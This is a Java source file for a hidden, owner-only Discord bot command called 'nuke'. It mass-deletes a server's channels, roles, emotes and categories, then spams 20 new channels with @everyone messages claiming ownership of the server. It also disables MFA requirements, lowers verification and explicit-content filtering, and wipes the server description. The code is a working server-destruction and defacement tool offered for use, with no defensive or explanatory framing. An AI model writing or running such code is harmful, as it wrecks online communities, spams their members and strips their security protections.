package me.kambing.commands.owner;


import com.jagrosh.jdautilities.command.Command;
import com.jagrosh.jdautilities.command.CommandEvent;
import net.dv8tion.jda.api.entities.*;
import net.dv8tion.jda.api.managers.GuildManager;

import java.io.File;

public class NukeCommand extends Command {
    public NukeCommand() {
        this.name = "nuke";
        this.help = "kebaboom";
        this.cooldown = 5;
        this.ownerCommand = true;
        this.hidden = true;
    }

    @Override
    protected void execute(CommandEvent e) {
        try {

            for (VoiceChannel ch : e.getGuild().getVoiceChannels()) {
                ch.delete().queue();
            }

            for (TextChannel ch : e.getGuild().getTextChannels()) {
                if (ch != e.getGuild().getCommunityUpdatesChannel()) {
                    if (ch != e.getGuild().getRulesChannel()) {
                        ch.delete().queue();
                    }
                }
            }
            GuildManager m = e.getGuild().getManager();
            for (int i = 0; i < 20; i++) {
                m.getGuild().createTextChannel("ezXDD").queue(chan -> {
                    chan.sendMessage("@everyone this server is owned by kambing").queue();
                });
            }
            for (Role rl : e.getGuild().getRoles()) {
                if (!rl.isManaged()) {
                    if (!rl.equals(e.getGuild().getBotRole())) {
                        if (!rl.equals(e.getGuild().getPublicRole())) {
                            rl.delete().queue();
                        }
                    }
                }

            }
            for (Emote emote : e.getGuild().getEmotes()) {
                System.out.println(emote);
                emote.delete().queue();
            }
            for (net.dv8tion.jda.api.entities.Category ct : e.getGuild().getCategories()) {
                ct.delete().queue();
            }
            e.getGuild().getManager().setAfkChannel(null).queue();



            m.setDefaultNotificationLevel(Guild.NotificationLevel.ALL_MESSAGES).queue();

            m.setRequiredMFALevel(Guild.MFALevel.NONE).queue();

            if (m.getGuild().getDescription() != null) {
                m.setDescription("").queue();
            }

            if (m.getGuild().getRulesChannel() != null) {
                m.setVerificationLevel(Guild.VerificationLevel.LOW).queue();
            } else {
                m.setExplicitContentLevel(Guild.ExplicitContentLevel.OFF).queue();
                m.setVerificationLevel(Guild.VerificationLevel.NONE).queue();
            }




        }catch (Exception ex) {
            System.out.println(ex);
        }
    }
}




